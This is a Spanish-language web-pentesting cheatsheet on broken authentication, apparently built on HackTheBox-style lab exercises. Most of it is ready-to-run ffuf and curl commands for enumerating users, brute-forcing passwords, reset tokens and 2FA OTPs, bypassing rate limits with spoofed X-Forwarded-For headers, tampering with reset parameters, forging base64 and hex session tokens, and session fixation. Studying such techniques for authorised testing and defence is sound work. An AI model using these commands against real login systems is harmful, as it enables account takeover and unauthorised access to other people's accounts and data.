---
title: "Broken Authentication"
description: "Weak passwords, session hijacking, MFA bypass y credential stuffing."
sidebar:
  order: 11
  label: "Broken Authentication"
---
> Ataques sobre mecanismos de autenticación: enumeración de usuarios, brute-force de passwords/tokens/2FA, bypass de auth, ataques a sesiones.

---


## Enumeración de usuarios

### Via mensajes de error diferentes

```bash
# Ejemplo: "Unknown user" vs "Invalid credentials" → revela si el user existe

# ffuf: filtrar respuestas con el mensaje de "usuario inválido"
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ&password=invalid" \
     -fr "Unknown user"

# Wordlists de usuarios
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

### Via registration / password reset

```bash
# Si el registro dice "User already exists" → el user existe
# Si el password reset dice "Email sent to..." → el email existe

# ffuf en registro
ffuf -w usernames.txt \
     -u http://TARGET/register.php \
     -X POST \
     -d "username=FUZZ&email=test@test.com&password=Test1234!" \
     -fr "User already exists"
```

---

## Credenciales por defecto

```bash
# Recursos para buscar default creds:
# - https://www.cirt.net/passwords
# - /usr/share/seclists/Passwords/Default-Credentials/
# - Google: "AppName default credentials"
# - GitHub del proyecto → README/INSTALL

# Ejemplos comunes
admin:admin
admin:password
admin:admin123
root:root
guest:guest
admin@admin.com:password    # BookStack
administrator:administrator

# ffuf con lista de pares user:pass (credential stuffing)
ffuf -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
     -u http://TARGET/login.php \
     -X POST \
     -d "username=FUZZ&password=FUZZ" \      # NOTA: requiere wordlist con user:pass separados
     -fr "Invalid"
```

---

## Brute-Force de passwords

### Filtrar wordlist por política de contraseñas

```bash
# Política: mínimo 10 chars, mayúsculas, minúsculas, dígito
grep ':upper:' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  | grep ':lower:' \
  | grep ':digit:' \
  | grep -E '.{10}' > custom_wordlist.txt

# Con awk (más eficiente)
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wordlist.txt

wc -l custom_wordlist.txt   # verificar reducción
```

### ffuf brute-force de login

```bash
# Interceptar login con Burp primero para identificar params y error message

ffuf -w ./custom_wordlist.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid username"

# Si hay cookie de sesión necesaria:
ffuf -w wordlist.txt \
     -u http://TARGET/login.php \
     -X POST \
     -b "PHPSESSID=SESSION_COOKIE" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid password"
```

---

## Brute-Force de tokens de reset de password

```bash
# Generar wordlist de tokens numéricos (ej: token de 4 dígitos)
seq -w 0 9999 > tokens.txt    # genera 0000, 0001, ..., 9999

# Generar tokens de 6 dígitos
seq -w 0 999999 > tokens6.txt

# ffuf en endpoint de reset (token en GET param)
ffuf -w ./tokens.txt \
     -u "http://TARGET/reset_password.php?token=FUZZ" \
     -fr "The provided token is invalid"

# ffuf en endpoint de reset (token en POST param)
ffuf -w ./tokens.txt \
     -u http://TARGET/reset_password.php \
     -X POST \
     -d "token=FUZZ&new_password=NewPass1!" \
     -fr "Invalid token"
```

---

## Bypass de 2FA (OTP brute-force)

```bash
# 1. Obtener credenciales válidas (o tenerlas via phishing)
# 2. Hacer login → web pide OTP/2FA
# 3. Interceptar la petición con Burp para ver:
#    - El endpoint (/2fa.php, /verify.php, etc.)
#    - El nombre del parámetro del OTP
#    - La cookie de sesión necesaria

# Generar tokens de 4 dígitos
seq -w 0 9999 > tokens.txt

# ffuf brute-force del OTP (la cookie PHPSESSID vincula el OTP a la sesión autenticada)
ffuf -w ./tokens.txt \
     -u http://TARGET/2fa.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
     -d "otp=FUZZ" \
     -fr "Invalid 2FA Code"

# Una vez encontrado el OTP correcto → la sesión queda autenticada → acceder a /admin.php
```

> **Nota:** tras encontrar el OTP válido, el servidor marca la sesión como "fully authenticated". Todos los requests posteriores con esa cookie tendrán acceso completo.

---

## Bypass de Rate Limit

```bash
# Si el rate limit usa X-Forwarded-For para identificar la IP → spoofear header

# ffuf con X-Forwarded-For aleatorio por request
ffuf -w wordlist.txt \
     -u http://TARGET/login.php \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "X-Forwarded-For: FUZZ" \   # FUZZ en el header también requiere wordlist de IPs
     -fr "Invalid"

# Alternativa: generar lista de IPs y combinar con -H
for i in {1..100}; do echo "1.2.3.$i"; done > ips.txt

# También probar otros headers de IP:
# X-Real-IP: RANDOM_IP
# True-Client-IP: RANDOM_IP
# X-Client-IP: RANDOM_IP

# ffuf con múltiples keywords (requires -w para cada FUZZ diferente)
ffuf -w wordlist.txt:FUZZ -w ips.txt:IP \
     -u http://TARGET/login.php \
     -X POST \
     -H "X-Forwarded-For: IP" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid"
```

---

## Password Reset — Logic Bugs

### Preguntas de seguridad predecibles

```bash
# Crear wordlist de ciudades
wget https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

# Filtrar por país si hay contexto OSINT
cat world-cities.csv | grep "Germany" | cut -d ',' -f1 > german_cities.txt

# ffuf de security question
ffuf -w ./city_wordlist.txt \
     -u http://TARGET/security_question.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=SESSION_COOKIE" \
     -d "security_response=FUZZ" \
     -fr "Incorrect response"
```

### Manipulación del parámetro username en reset

```bash
# Interceptar con Burp la petición final de reset de password
# POST /reset_password.php
# Body: password=NewPass&username=htb-stdnt

# Cambiar username al target admin
POST /reset_password.php HTTP/1.1
Cookie: PHPSESSID=abc123

password=P@$$w0rd&username=admin    # cambiar aquí el username
```

---

## Auth Bypass directo

### Acceso directo a página protegida

```bash
# Si la app usa redirect sin exit:
# PHP: header("Location: index.php"); sin exit → el body se devuelve igual

# 1. Intentar acceder directamente
curl -s http://TARGET/admin.php
# Respuesta: 302 con body de admin en HTML → cambiar código en Burp

# En Burp:
# Intercept Response → cambiar "302 Found" → "200 OK"
# Eliminar el header "Location:" de la respuesta
```

### Modificación de parámetro de auth

```bash
# La app usa ?user_id= para determinar quién accede
# Si /admin.php sin user_id → redirect al login
# Si /admin.php?user_id=183 → funciona sin cookie válida

# Brute-force del user_id admin
ffuf -w /usr/share/seclists/Fuzzing/Integers/Integers-Medium.txt \
     -u "http://TARGET/admin.php?user_id=FUZZ" \
     -fr "Could not load admin data"

# Acceder como admin
curl http://TARGET/admin.php?user_id=1
```

---

## Ataques a Session Tokens

### Identificar tokens débiles

```bash
# Hacer varios logins y capturar las cookies de sesión
# Buscar patrones: prefijo/sufijo estático, incremento, base64

# Analizar si es base64
echo -n "dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy" | base64 -d
# → user=htb-stdnt;role=user

# Analizar si es hex
echo "757365723d6874622d73746d6e743b726f6c653d75736572" | xxd -p -r
# → user=htb-stdnt;role=user
```

### Forge de session token basada en base64

```bash
# Decodificar token existente
echo -n "TOKEN_BASE64" | base64 -d
# → user=htb-stdnt;role=user

# Modificar el rol y re-encodear
echo -n 'user=htb-stdnt;role=admin' | base64
# → dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==

# Usar el token forjado
curl -b "session=dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==" http://TARGET/admin.php
```

### Forge de session token basada en hex

```bash
# Decodificar token hex
echo "757365723d..." | xxd -p -r

# Modificar y re-encodear
echo -n 'user=htb-stdnt;role=admin' | xxd -p
# → 757365723d6874622d7374646e743b726f6c653d61646d696e

curl -b "session=757365723d6874622d7374646e743b726f6c653d61646d696e" http://TARGET/admin.php
```

### Brute-force de tokens débiles

```bash
# Token de 4 chars hex → 65536 posibilidades (16^4)
# Generar wordlist hex
python3 -c "
for i in range(65536):
    print(format(i, '04x'))
" > hex_tokens.txt

# ffuf de session token
ffuf -w ./hex_tokens.txt \
     -u http://TARGET/admin.php \
     -b "session=FUZZ" \
     -fr "Access Denied" \
     -mc 200
```

### Session Fixation

```bash
# 1. Obtener un session token válido (no hace falta estar autenticado)
curl -c session.txt http://TARGET/

# 2. Enviar al víctima una URL con el token conocido
# http://TARGET/?sid=NUESTRO_TOKEN

# 3. Esperar a que el víctima se autentique con ese token
# 4. Usar nuestro token → acceso a la sesión del víctima
curl -b "session=NUESTRO_TOKEN" http://TARGET/admin.php
```

---

## Checklist de testing de autenticación

```
□ Probar credenciales por defecto (admin:admin, admin:password, etc.)
□ Enumerar usuarios (mensajes de error distintos en login, registro, reset)
□ Revisar política de contraseñas → generar wordlist filtrada
□ Brute-force con wordlist filtrada + ffuf
□ Analizar token de reset → ¿es numérico corto? ¿predecible?
□ Interceptar flujo de reset → ¿hay parámetro username en request final?
□ Preguntas de seguridad → buscar con worldlists de ciudades/nombres
□ 2FA con OTP corto → brute-force con cookie de sesión
□ Probar X-Forwarded-For para bypass de rate limit
□ Acceder directamente a /admin.php, /dashboard.php, /panel.php
□ Si hay redirect → interceptar response en Burp → cambiar 302→200
□ Buscar parámetros de auth en URL (?user_id=, ?admin=true, ?role=user)
□ Capturar múltiples session tokens → analizar patrones
□ Decodificar session token (base64, hex) → modificar rol → re-encodear
□ Verificar timeout de sesión (sesión inválida tras cerrar browser?)
```

---

## Pitfalls / Gotchas

- **Mensaje de error idéntico no descarta enumeración:** medir el tiempo de respuesta — el servidor puede tardar más buscando en BD para usuarios válidos.
- **Session cookie en ffuf para 2FA:** olvidar el flag `-b` hace que todos los requests se traten como unauthenticated → nunca encuentras el OTP correcto.
- **Rate limit por IP vs X-Forwarded-For:** probar primero sin bypass, luego con `X-Forwarded-For: 1.1.1.1` cambiante. Algunos servidores ignoran ese header.
- **Reset token con padding:** al fuzzear tokens numéricos, `seq -w` asegura que `7` se envíe como `0007`. Sin padding, tokens válidos con ceros al inicio se pierden.
- **302 sin exit en PHP = body expuesto:** aunque el browser redirige, el body protegido viaja en la respuesta HTTP. curl lo muestra; Burp permite interceptarlo.
- **username en parámetro oculto:** inspeccionar todos los parámetros del request de reset — incluyendo campos hidden. Interceptar siempre con Burp, no solo mirar el form.
- **Token base64 con padding `==`:** si al re-encodear el token manipulado tiene `=` o `==` al final, asegurarse de que la cookie lo incluye (URL-encodear si necesario: `%3D%3D`).
- **Session Fixation requiere que la app no regenere el token en login:** verificar si `Set-Cookie` aparece en la respuesta al login.

---

## Cheatsheets relacionados

- [Web Requests](/metodologias/fundamentos/web-requests/) — HTTP, cookies, autenticación básica
- [Web Fuzzing](/metodologias/recon/web-fuzzing/) — ffuf, wordlists, filtros
- [API Attacks](/metodologias/web/api-attacks/) — auth bypass en APIs REST
- [Server-side Attacks](/metodologias/web/server-side-attacks/) — SSRF, SSTI que pueden revelar tokens
